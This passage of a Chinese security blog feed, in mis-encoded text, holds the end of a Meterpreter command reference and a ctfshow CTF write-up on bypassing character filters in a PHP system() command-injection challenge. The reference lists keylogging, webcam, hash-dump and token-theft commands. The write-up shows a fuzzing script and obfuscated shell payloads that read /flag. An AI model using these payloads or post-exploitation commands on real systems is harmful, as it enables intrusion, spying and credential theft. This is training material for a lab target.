class="line">cp                            å°†æºå¤åˆ¶åˆ°ç›®æ ‡</span><br><span class="line">del                           åˆ é™¤æŒ‡å®šæ–‡ä»¶</span><br><span class="line">dir                           åˆ—å‡ºæ–‡ä»¶ï¼ˆls çš„åˆ«åï¼‰</span><br><span class="line">download                      ä¸‹è½½æ–‡ä»¶æˆ–ç›®å½•</span><br><span class="line">edit                          ç¼–è¾‘æ–‡ä»¶</span><br><span class="line">getlwd                        æ‰“å°æœ¬åœ°å·¥ä½œç›®å½•</span><br><span class="line">getwd                         æ‰“å°å·¥ä½œç›®å½•</span><br><span class="line">lcd                           æ›´æ”¹æœ¬åœ°å·¥ä½œç›®å½•</span><br><span class="line">lls                           åˆ—å‡ºæœ¬åœ°æ–‡ä»¶</span><br><span class="line">lpwd                          æ‰“å°æœ¬åœ°å·¥ä½œç›®å½•</span><br><span class="line">ls                            åˆ—å‡ºæ–‡ä»¶</span><br><span class="line">mkdir                         åˆ¶ä½œç›®å½•</span><br><span class="line">mv                            å°†æºç§»åŠ¨åˆ°ç›®æ ‡</span><br><span class="line">pwd                           æ‰“å°å·¥ä½œç›®å½•</span><br><span class="line">rm                            åˆ é™¤æŒ‡å®šæ–‡ä»¶</span><br><span class="line">rmdir                         åˆ é™¤ç›®å½•</span><br><span class="line">search                        æœç´¢æ–‡ä»¶</span><br><span class="line">show_mount                    åˆ—å‡ºæ‰€æœ‰æŒ‚è½½ç‚¹/é€»è¾‘é©±åŠ¨å™¨</span><br><span class="line">upload                        ä¸Šä¼ æ–‡ä»¶æˆ–ç›®å½•</span><br><span class="line"></span><br><span class="line">==========================================</span><br><span class="line">Stdapiï¼šç½‘ç»œå‘½ä»¤</span><br><span class="line">==========================================</span><br><span class="line">å‘½ä»¤                           è¯´æ˜</span><br><span class="line">-------                       ------------</span><br><span class="line">arp                           æ˜¾ç¤ºä¸»æœº ARP ç¼“å­˜</span><br><span class="line">getproxy                      æ˜¾ç¤ºå½“å‰ä»£ç†é…ç½®</span><br><span class="line">ifconfig                      æ˜¾ç¤ºç•Œé¢</span><br><span class="line">ipconfig                      æ˜¾ç¤ºæ¥å£</span><br><span class="line">netstat                       æ˜¾ç¤ºç½‘ç»œè¿æ¥</span><br><span class="line">portfwd                       å°†æœ¬åœ°ç«¯å£è½¬å‘åˆ°è¿œç¨‹æœåŠ¡</span><br><span class="line">resolve                       è§£æç›®æ ‡ä¸Šçš„ä¸€ç»„ä¸»æœºå</span><br><span class="line">route                         æŸ¥çœ‹å’Œä¿®æ”¹è·¯ç”±è¡¨</span><br><span class="line"></span><br><span class="line">==========================================</span><br><span class="line">Stdapiï¼šç³»ç»Ÿå‘½ä»¤</span><br><span class="line">==========================================</span><br><span class="line">å‘½ä»¤                           è¯´æ˜</span><br><span class="line">-------                       ------------</span><br><span class="line">clearev                       æ¸…é™¤äº‹ä»¶æ—¥å¿—</span><br><span class="line">drop_token                    æ”¾å¼ƒä»»ä½•æ´»åŠ¨çš„æ¨¡æ‹Ÿä»¤ç‰Œã€‚</span><br><span class="line">execute                       æ‰§è¡Œå‘½ä»¤</span><br><span class="line">getenv                        è·å–ä¸€ä¸ªæˆ–å¤šä¸ªç¯å¢ƒå˜é‡å€¼</span><br><span class="line">getpid                        è·å–å½“å‰è¿›ç¨‹æ ‡è¯†ç¬¦</span><br><span class="line">getprivs                      å°è¯•å¯ç”¨å½“å‰è¿›ç¨‹å¯ç”¨çš„æ‰€æœ‰æƒé™</span><br><span class="line">getid                         è·å–æœåŠ¡å™¨è¿è¡Œçš„ç”¨æˆ·çš„ SID</span><br><span class="line">getuid                        è·å–æœåŠ¡å™¨è¿è¡Œçš„ç”¨æˆ·</span><br><span class="line">kill                          ç»ˆæ­¢è¿›ç¨‹</span><br><span class="line">localtime                     æ˜¾ç¤ºç›®æ ‡ç³»ç»Ÿæœ¬åœ°æ—¥æœŸå’Œæ—¶é—´</span><br><span class="line">pgrep                         æŒ‰åç§°è¿‡æ»¤è¿›ç¨‹</span><br><span class="line">pkill                         æŒ‰åç§°ç»ˆæ­¢è¿›ç¨‹</span><br><span class="line">ps                            åˆ—å‡ºæ­£åœ¨è¿è¡Œçš„è¿›ç¨‹</span><br><span class="line">reboot                        é‡å¯è¿œç¨‹è®¡ç®—æœº</span><br><span class="line">reg                           ä¿®æ”¹è¿œç¨‹æ³¨å†Œè¡¨å¹¶ä¸ä¹‹äº¤äº’</span><br><span class="line">rev2self                      åœ¨è¿œç¨‹æœºå™¨ä¸Šè°ƒç”¨ RevertToSelf()</span><br><span class="line">shell                         æ”¾å…¥ç³»ç»Ÿå‘½ä»¤ shell</span><br><span class="line">shutdown                      å…³é—­è¿œç¨‹è®¡ç®—æœº</span><br><span class="line">steal_token                   å°è¯•ä»ç›®æ ‡è¿›ç¨‹çªƒå–æ¨¡æ‹Ÿä»¤ç‰Œ</span><br><span class="line">suspend                       æš‚åœæˆ–æ¢å¤è¿›ç¨‹åˆ—è¡¨</span><br><span class="line">sysinfo                       è·å–æœ‰å…³è¿œç¨‹ç³»ç»Ÿçš„ä¿¡æ¯ï¼Œä¾‹å¦‚ OS</span><br><span class="line"></span><br><span class="line">==========================================</span><br><span class="line">Stdapiï¼šç”¨æˆ·ç•Œé¢å‘½ä»¤</span><br><span class="line">==========================================</span><br><span class="line">å‘½ä»¤                           è¯´æ˜</span><br><span class="line">-------                       ------------</span><br><span class="line">enumdesktops                  åˆ—å‡ºæ‰€æœ‰å¯è®¿é—®çš„æ¡Œé¢å’Œçª—å£ç«™</span><br><span class="line">getdesktop                    è·å–å½“å‰çš„meterpreteræ¡Œé¢</span><br><span class="line">idletime                      è¿”å›è¿œç¨‹ç”¨æˆ·ç©ºé—²çš„ç§’æ•°</span><br><span class="line">keyboard_send                 å‘é€å‡»é”®</span><br><span class="line">keyevent                      å‘é€æŒ‰é”®äº‹ä»¶</span><br><span class="line">keyscan_dump                  è½¬å‚¨å‡»é”®ç¼“å†²åŒº</span><br><span class="line">keyscan_start                 å¼€å§‹æ•è·å‡»é”®</span><br><span class="line">keyscan_stop                  åœæ­¢æ•è·å‡»é”®</span><br><span class="line">mouse                         å‘é€é¼ æ ‡äº‹ä»¶</span><br><span class="line">screenshare                   å®æ—¶è§‚çœ‹è¿œç¨‹ç”¨æˆ·æ¡Œé¢</span><br><span class="line">screenshot                    æŠ“å–äº¤äº’å¼æ¡Œé¢çš„æˆªå›¾</span><br><span class="line">setdesktop                    æ›´æ”¹meterpreterså½“å‰æ¡Œé¢</span><br><span class="line">uictl                         æ§åˆ¶ä¸€äº›ç”¨æˆ·ç•Œé¢ç»„ä»¶</span><br><span class="line"></span><br><span class="line">==========================================</span><br><span class="line">Stdapiï¼šç½‘ç»œæ‘„åƒå¤´å‘½ä»¤ï¼š</span><br><span class="line">==========================================</span><br><span class="line">å‘½ä»¤                           è¯´æ˜</span><br><span class="line">-------                       ------------</span><br><span class="line">record_mic                    ä»é»˜è®¤éº¦å…‹é£å½•åˆ¶éŸ³é¢‘ X ç§’</span><br><span class="line">webcam_chat                   å¼€å§‹è§†é¢‘èŠå¤©</span><br><span class="line">webcam_list                   åˆ—å‡ºç½‘ç»œæ‘„åƒå¤´</span><br><span class="line">webcam_snap                   ä»æŒ‡å®šçš„ç½‘ç»œæ‘„åƒå¤´æ‹æ‘„å¿«ç…§</span><br><span class="line">webcam_stream                 ä»æŒ‡å®šçš„ç½‘ç»œæ‘„åƒå¤´æ’­æ”¾è§†é¢‘æµ</span><br><span class="line"></span><br><span class="line">==========================================</span><br><span class="line">Stdapiï¼šéŸ³é¢‘è¾“å‡ºå‘½ä»¤ï¼š</span><br><span class="line">==========================================</span><br><span class="line">å‘½ä»¤                           è¯´æ˜</span><br><span class="line">-------                       ------------</span><br><span class="line">play                          åœ¨ç›®æ ‡ç³»ç»Ÿä¸Šæ’­æ”¾æ³¢å½¢éŸ³é¢‘æ–‡ä»¶ (.wav)</span><br><span class="line"></span><br><span class="line">==========================================</span><br><span class="line">Privï¼šæƒé™æå‡å‘½ä»¤ï¼š</span><br><span class="line">==========================================</span><br><span class="line">å‘½ä»¤                           è¯´æ˜</span><br><span class="line">-------                       ------------</span><br><span class="line">getsystem                     å°è¯•å°†æ‚¨çš„æƒé™æå‡åˆ°æœ¬åœ°ç³»ç»Ÿçš„æƒé™ã€‚</span><br><span class="line"></span><br><span class="line">==========================================</span><br><span class="line">Privï¼šå¯†ç æ•°æ®åº“å‘½ä»¤ï¼š</span><br><span class="line">==========================================</span><br><span class="line">å‘½ä»¤                           è¯´æ˜</span><br><span class="line">-------                       ------------</span><br><span class="line">hashdump                      è½¬å‚¨ SAM æ•°æ®åº“çš„å†…å®¹</span><br><span class="line"></span><br><span class="line">==========================================</span><br><span class="line">Privï¼šTimestomp å‘½ä»¤ï¼š</span><br><span class="line">==========================================</span><br><span class="line">å‘½ä»¤                           è¯´æ˜</span><br><span class="line">-------                       ------------</span><br><span class="line">timestomp                     æ“ä½œæ–‡ä»¶ MACE å±æ€§</span><br><span class="line"></span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure>

<p><a href="https://blog.csdn.net/weixin_45588247/article/details/119614618">(4æ¡æ¶ˆæ¯) ã€å·¥å…·ä½¿ç”¨ã€‘â€”â€”Metasploit(MSF)ä½¿ç”¨è¯¦è§£(è¶…è¯¦ç»†)_metasploitä½¿ç”¨æ•™ç¨‹_å‰‘å®¢ getshellçš„åšå®¢-CSDNåšå®¢</a></p>
]]></content>
  </entry>
  <entry>
    <title>æé™å‘½ä»¤æ‰§è¡Œ</title>
    <url>/2023/04/08/%E6%9E%81%E9%99%90%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
    <content><![CDATA[<p>â€‹     ctfshow æé™å‘½ä»¤æ‰§è¡Œ</p>
<p>åˆå­¦ä¹ åˆ°å¥½å¤šå§¿åŠ¿</p>
<span id="more"></span>

<h2 id="æé™å‘½ä»¤æ‰§è¡Œ1"><a href="#æé™å‘½ä»¤æ‰§è¡Œ1" class="headerlink" title="æé™å‘½ä»¤æ‰§è¡Œ1"></a>æé™å‘½ä»¤æ‰§è¡Œ1</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//æœ¬é¢˜çµæ„Ÿæ¥è‡ªç ”ç©¶ä¸€ç›´æ²¡åšå‡ºæ¥çš„æŸèµ›æŸé¢˜æ—¶æƒ³åˆ°çš„å§¿åŠ¿ï¼Œå¤ªæ£’å•¦~ã€‚</span><br><span class="line">//flagåœ¨æ ¹ç›®å½•flagé‡Œï¼Œæˆ–è€…ç›´æ¥è¿è¡Œæ ¹ç›®å½•getflag</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">if (isset($_POST[&#x27;ctf_show&#x27;])) &#123;</span><br><span class="line">    $ctfshow = $_POST[&#x27;ctf_show&#x27;];</span><br><span class="line">    if (!preg_match(&quot;/[b-zA-Z_@#%^&amp;*:&#123;&#125;\-\+&lt;&gt;\&quot;|`;\[\]]/&quot;,$ctfshow))&#123;</span><br><span class="line">            system($ctfshow);</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo(&quot;????????&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>fuzzä¸€ä¸‹</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$a</span> = <span class="number">0</span>; <span class="variable">$a</span> &lt; <span class="number">256</span>; <span class="variable">$a</span>++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[b-zA-Z_@#%^&amp;*:&#123;&#125;\-\+&lt;&gt;\&quot;|`;\[\]]/&quot;</span>, <span class="title function_ invoke__">chr</span>(<span class="variable">$a</span>))) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">chr</span>(<span class="variable">$a</span>)) . <span class="string">&quot; &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">//+ ! $ &#x27; ( ) , . / 0 1 2 3 4 5 6 7 8 9 = ? \ a ~</span></span><br></pre></td></tr></table></figure>

<p>é¢˜ç›®ç»™äº†æç¤ºï¼š<strong>æœ¬å¥—é¢˜ç›®è¿è¡Œç¯å¢ƒå‡ä¸ºCENTOS7</strong></p>
<p>ä½†æ˜¯è¿™æ˜¯æ ¹æ®wpçš„ï¼Œæˆ‘æœ¬åœ°centos7æ— æ³•æ‰§è¡Œ&#x2F;getflag</p>
<p>è§£æ³•ä¸€</p>
<p>&#x2F;getflag</p>
<p>ç»™å‡ºpayload: ctf_show&#x3D;&#x2F;?????a?</p>
<p>è§£æ³•äºŒï¼š &#x2F;bin&#x2F;base64 &#x2F;flag</p>
<p> payload: ctf_show&#x3D;&#x2F;???&#x2F;?a??64 &#x2F;??a?</p>
<p>è§£æ³•ä¸‰</p>
<p>ctf_show&#x3D;&#x2F;bin&#x2F;bash &#x2F;flag</p>
<p>payloadï¼š ctf_show&#x3D;&#x2F;???&#x2F;?a?? &#x2F;??a?</p>
<h2 id="æé™å‘½ä»¤æ‰§è¡Œ2"><a href="#æé™å‘½ä»¤æ‰§è¡Œ2" class="headerlink" title="æé™å‘½ä»¤æ‰§è¡Œ2"></a>æé™å‘½ä»¤æ‰§è¡Œ2</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include &quot;check.php&quot;;</span><br><span class="line"></span><br><span class="line">if (isset($_POST[&#x27;ctf_show&#x27;])) &#123;</span><br><span class="line">    $ctfshow = $_POST[&#x27;ctf_show&#x27;];</span><br><span class="line">    check($ctfshow);</span><br><span class="line">    system($ctfshow);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>bp fuzzä¸€ä¸‹</p>
<p><img src="/2023/04/08/%E6%9E%81%E9%99%90%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/QQ%E6%88%AA%E5%9B%BE20230411135838.png"></p>
<p><img src="/2023/04/08/%E6%9E%81%E9%99%90%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/QQ%E6%88%AA%E5%9B%BE20230411135932.png"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://40e404d6-3af3-401c-b11c-9e48298fd1ce.challenge.ctf.show/&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="built_in">str</span>= <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">255</span>):</span><br><span class="line">    data = &#123;<span class="string">&#x27;ctf_show&#x27;</span>:<span class="built_in">chr</span>(i)&#125;</span><br><span class="line">    retext = requests.post(url,data=data).text</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;??????&quot;</span> <span class="keyword">in</span> retext:</span><br><span class="line">        <span class="built_in">print</span>(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">str</span> += <span class="built_in">chr</span>(i)</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>)</span><br></pre></td></tr></table></figure>

<p>python fuzzè„šæœ¬</p>
<p>payloadï¼š &#x2F;getflag</p>
<p>ä½†æ˜¯æˆ‘åœ¨centos7ä¸Šè¯•äº†è¯•å¹¶æ²¡æœ‰æˆåŠŸ</p>
<p>åŒæ ·ï¼Œå…¶ä»–å®éªŒç»“æœ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#x27;\154\163&#x27; #ls æˆåŠŸ</span><br><span class="line">$&#x27;\57\146\154\141\147&#x27;        # /flag   æˆåŠŸ</span><br><span class="line">$&#x27;\57\147\145\164\146\154\141\147&#x27; # /getflag å¤±è´¥</span><br><span class="line">$&#x27;\164\141\143\40\57\146\154\141\147&#x27; #/tac /flag å¤±è´¥</span><br><span class="line">æŠ¥é”™å†…å®¹bash: tac /flag: æ²¡æœ‰é‚£ä¸ªæ–‡ä»¶æˆ–ç›®å½•</span><br></pre></td></tr></table></figure>

<p>èƒ½è§£å‡ºé¢˜ç›®çš„payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctf_show=$&#x27;\57\147\145\164\146\154\141\147&#x27;</span><br></pre></td></tr></table></figure>

<h2 id="æé™å‘½ä»¤æ‰§è¡Œ3"><a href="#æé™å‘½ä»¤æ‰§è¡Œ3" class="headerlink" title="æé™å‘½ä»¤æ‰§è¡Œ3"></a>æé™å‘½ä»¤æ‰§è¡Œ3</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include &quot;check.php&quot;;</span><br><span class="line"></span><br><span class="line">if (isset($_POST[&#x27;ctf_show&#x27;])) &#123;</span><br><span class="line">    $ctfshow = $_POST[&#x27;ctf_show&#x27;];</span><br><span class="line">    check($ctfshow);</span><br><span class="line">    system($ctfshow);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">!#$&amp;&#x27;()01&lt;\_&#123;&#125;~</span><br></pre></td></tr></table></figure>

<p>åœ¨linux ä¸­ï¼Œ</p>
<p>å•å¼•å·â€™â€™ï¼ŒåŒå¼•å·â€â€çš„åŒºåˆ«æ˜¯</p>
<p>å•å¼•å·â€™â€™å‰¥å¤ºäº†æ‰€æœ‰å­—ç¬¦çš„ç‰¹æ®Šå«ä¹‰ï¼Œå•å¼•å·â€™â€™å†…å°±å˜æˆäº†å•çº¯çš„å­—ç¬¦ï¼Œã€‚</p>
<p>åŒå¼•å·â€â€åˆ™å¯¹äºåŒå¼•å·â€â€å†…çš„å‚æ•°æ›¿æ¢($)å’Œå‘½ä»¤æ›¿æ¢(&#96;&#96;)æ˜¯ä¸ªä¾‹å¤–ã€‚</p>
<p>æ¯”å¦‚è¯´ n&#x3D;3</p>
<p>echo â€˜$nâ€™</p>
<p>ç»“æœå°±æ˜¯$n</p>
<p>æ”¹æˆåŒå¼•å· echo â€œ$nâ€ï¼Œç»“æœå°±æ˜¯3</p>
<p>[(9æ¡æ¶ˆæ¯) linuxä¸­å•å¼•å·â€˜ ,åŒå¼•å·â€œ, åå¼•å· <code> </code>, $, $(), ${}ä¸å˜é‡_linuxå•å¼•å·ä¸­å¼•ç”¨å˜é‡_TGAOçš„åšå®¢-CSDNåšå®¢](<a href="https://blog.csdn.net/qq_40491569/article/details/83688652#:~:text=%E5%8D%95%E5%BC%95%E5%8F%B7">https://blog.csdn.net/qq_40491569/article/details/83688652#:~:text=å•å¼•å·</a> ï¼šä¸è¿›è¡Œè½¬è¯‘å’Œè·å– å˜é‡ ï¼Œè¾“å‡ºåŸå­—ç¬¦ä¸² echo â€˜dateâ€™ date åŒå¼•å·,Dec 29 10%3A33%3A40 CST 2020 echo date date)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$(( ))å±äºæ‰§è¡Œè®¡ç®—å…¬å¼ï¼Œç­‰ä»·äº$[ ]ï¼Œ$( )å’Œ` `å±äºå‘½ä»¤æ›¿æ¢ï¼Œ$&#123; &#125;å±äºå˜é‡æ›¿æ¢</span><br></pre></td></tr></table></figure>

<p>bashé‡ŒäºŒè¿›åˆ¶å¯è¡¨ç¤ºä¸º</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo $((2#100))</span><br><span class="line">4</span><br></pre></td></tr></table></figure>

<p> ä½†æ˜¯ç”±äºæŠŠ2è¿‡æ»¤äº†ï¼Œæ‰€ä»¥ä½¿ç”¨ä½è¿ç®—ç¬¦å·æ„é€ å‡º2</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo $((1&lt;&lt;1))</span><br><span class="line">2</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;&lt;&lt;ä¸‰ä¸ªå°äºå·(here-strings)ï¼Œè¯­æ³•ï¼šcommand [args] &lt;&lt;&lt;[&quot;]$word[&quot;]ï¼›$wordä¼šå±•å¼€å¹¶ä½œä¸ºcommandçš„stdin</span><br></pre></td></tr></table></figure>

<p>è§£æä¸€æ¬¡åcat &#x2F;flag ä¸ºå­—ç¬¦ä¸²</p>
<p>ç©ºæ ¼å¹¶æ²¡æœ‰è¢«è§£æ</p>
<p>ä½¿ç”¨ä¸¤æ¬¡here-stringsï¼Œä½¿å…¶æˆä¸ºæ ‡å‡†è¾“å…¥å»æ‰§è¡Œè¿™ä¸ªå¤æ‚å‘½ä»¤</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctf_show=$0&lt;&lt;&lt;$0\&lt;\&lt;\&lt;\$\&#x27;\\$(($((1&lt;&lt;1))#10001111))\\$(($((1&lt;&lt;1))#10001101))\\$(($((1&lt;&lt;1))#10100100))\\$(($((1&lt;&lt;1))#101000))\\$(($((1&lt;&lt;1))#111001))\\$(($((1&lt;&lt;1))#10010010))\\$(($((1&lt;&lt;1))#10011010))\\$(($((1&lt;&lt;1))#10001101))\\$(($((1&lt;&lt;1))#10010011))\&#x27;</span><br></pre></td></tr></table></figure>

<h2 id="æé™å‘½ä»¤æ‰§è¡Œ4"><a href="#æé™å‘½ä»¤æ‰§è¡Œ4" class="headerlink" title="æé™å‘½ä»¤æ‰§è¡Œ4"></a>æé™å‘½ä»¤æ‰§è¡Œ4</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//æœ¬é¢˜çµæ„Ÿæ¥è‡ªç ”ç©¶ä¸€ç›´æ²¡åšå‡ºæ¥çš„æŸèµ›æŸé¢˜æ—¶æƒ³åˆ°çš„å§¿åŠ¿ï¼Œå¤ªæ£’å•¦~ã€‚</span><br><span class="line">//flagåœ¨æ ¹ç›®å½•flagé‡Œ</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include &quot;check.php&quot;;</span><br><span class="line"></span><br><span class="line">if (isset($_POST[&#x27;ctf_show&#x27;])) &#123;</span><br><span class="line">    $ctfshow = $_POST[&#x27;ctf_show&#x27;];</span><br><span class="line">    check($ctfshow);</span><br><span class="line">    system($ctfshow);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>fuzz ä¸€ä¸‹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">url = &quot;http://40e404d6-3af3-401c-b11c-9e48298fd1ce.challenge.ctf.show/&quot;</span><br><span class="line"> </span><br><span class="line">str= &quot;&quot;</span><br><span class="line">for i in range(255):</span><br><span class="line">    data = &#123;&#x27;ctf_show&#x27;:chr(i)&#125;</span><br><span class="line">    retext = requests.post(url,data=data).text</span><br><span class="line">    if &quot;??????&quot; in retext:</span><br><span class="line">        print(1)</span><br><span class="line">    else:</span><br><span class="line">        str += chr(i)</span><br><span class="line"> </span><br><span class="line">print(str)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">!#$&amp;&#x27;()0&lt;\_&#123;&#125;~</span><br></pre></td></tr></table></figure>

<p>1æ²¡äº†æ„é€ 1,$: ç¬¬ä¸€ä¸ª#æ˜¯è®¡ç®—å­—ç¬¦é•¿åº¦ï¼Œç¬¬äºŒä¸ª#æ˜¯å­—ç¬¦ä¸²çš„åå­—ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo $&#123;##&#125;</span><br><span class="line">1</span><br></pre></td></tr></table></figure>

<p>payloadï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctf_show=$0&lt;&lt;&lt;$0\&lt;\&lt;\&lt;\$\&#x27;\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;000$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;000$&#123;##&#125;$&#123;##&#125;0$&#123;##&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;0$&#123;##&#125;00$&#123;##&#125;00))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;0$&#123;##&#125;000))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;00$&#123;##&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;00$&#123;##&#125;00$&#123;##&#125;0))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;00$&#123;##&#125;$&#123;##&#125;0$&#123;##&#125;0))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;000$&#123;##&#125;$&#123;##&#125;0$&#123;##&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;00$&#123;##&#125;00$&#123;##&#125;$&#123;##&#125;))\&#x27;</span><br></pre></td></tr></table></figure>



<h2 id="æé™å‘½ä»¤æ‰§è¡Œ5"><a href="#æé™å‘½ä»¤æ‰§è¡Œ5" class="headerlink" title="æé™å‘½ä»¤æ‰§è¡Œ5"></a>æé™å‘½ä»¤æ‰§è¡Œ5</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//æœ¬é¢˜çµæ„Ÿæ¥è‡ªç ”ç©¶ä¸€ç›´æ²¡åšå‡ºæ¥çš„æŸèµ›æŸé¢˜æ—¶æƒ³åˆ°çš„å§¿åŠ¿ï¼Œå¤ªæ£’å•¦~ã€‚</span><br><span class="line">//flagåœ¨æ ¹ç›®å½•flagé‡Œ</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include &quot;check.php&quot;;</span><br><span class="line">if (isset($_POST[&#x27;ctf_show&#x27;])) &#123;</span><br><span class="line">    $ctfshow = $_POST[&#x27;ctf_show&#x27;];</span><br><span class="line">    check($ctfshow);</span><br><span class="line">    system($ctfshow);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>fuzzä¸€ä¸‹ï¼Œè¿˜å‰© <code>! $ &amp; &#39; ()&lt;+\-&#123;&#125;~</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo $(())</span><br><span class="line">ç»“æœä¸º0</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctf_show=__=$(())%26%26$&#123;!__&#125;&lt;&lt;&lt;$&#123;!__&#125;\&lt;\&lt;\&lt;\$\&#x27;\\$((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\\$((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))))))\\$((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\\$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$(())\\$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\\$((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\\$((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\\$((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))))))\\$((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\&#x27;</span><br></pre></td></tr></table></figure>

<p><a href="https://www.cnblogs.com/GTL-JU/p/17128363.html">ctfshow-æé™å‘½ä»¤æ‰§è¡Œå¤ç° - GTL_JU - åšå®¢å›­ (cnblogs.com)</a></p>
]]></content>
      <tags>
        <tag>ctfshow</tag>
      </tags>
  </entry>
  <entry>
    <title>çˆ†ç ´</title>
    <url>/2023/04/29/%E7%88%86%E7%A0%B4/</url>
    <content><![CDATA[<p>ctfshow çˆ†ç ´</p>
<span id="more"></span>

